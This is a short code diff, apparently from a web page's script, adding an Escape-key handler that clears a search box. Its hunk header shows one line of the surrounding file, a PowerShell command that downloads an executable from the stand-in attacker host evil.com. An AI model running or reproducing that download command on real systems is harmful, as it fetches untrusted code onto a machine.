@@ -468,6 +468,14 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         searchInput.focus();
     });
 
+    searchInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            searchInput.value = '';
+            searchInput.dispatchEvent(new Event('input'));
+            searchInput.focus();
+        }
+    });
+
     // Keyboard shortcut for search
     document.addEventListener('keydown', (e) => {
         const activeTag = document.activeElement.tagName;
